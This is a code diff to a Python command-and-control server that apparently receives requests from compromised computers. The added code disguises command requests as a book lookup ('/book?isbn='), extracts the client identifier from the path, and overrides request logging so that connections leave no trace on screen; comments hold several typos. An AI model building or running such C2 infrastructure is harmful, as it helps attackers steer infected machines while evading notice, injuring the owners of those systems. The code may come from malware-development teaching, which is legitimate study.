@@ -9,6 +9,9 @@ PORT = 80
 # Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
 BIND_ADDR = ""
 
+# Path to use for signifying a command request form a client using HTTP GET
+CMD_REQUEST = "/book?isbn="
+
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
     It handles all HTTP requests that arrive at the c2 server."""
@@ -22,12 +25,20 @@ class C2Handler(BaseHTTPRequestHandler):
         """ This method handles all HTTP GET requests that
         arrive at the c2 server."""
 
+        #Follow this code block when the compromised computer is requesting a command
+        if self.path.startswith(CMD_REQUEST):
+            client = self.path.split(CMD_REQUEST)[1]
+            print(client)
+
         # Sends the HTTP response code and header back to the client
         self.send_response(404)
         self.end_headers()
 
-print("server_version: ", C2Handler.server_version)
-print("sys_version: ", C2Handler.sys_version)
+    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
+        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
+        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
+        return
+        # return super().log_request(code, size)()
 
 # Instantiate our HTTPServer object
 # noinspection PyTypeChecker
